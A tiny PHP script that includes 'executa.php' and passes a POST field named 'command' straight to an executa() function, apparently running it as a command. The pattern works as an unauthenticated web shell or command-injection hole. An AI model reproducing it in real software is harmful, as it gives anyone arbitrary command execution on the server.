<?php


include 'executa.php';

if(isset($_POST['command'])){
    $comanda=$_POST['command'];
    executa($comanda);
}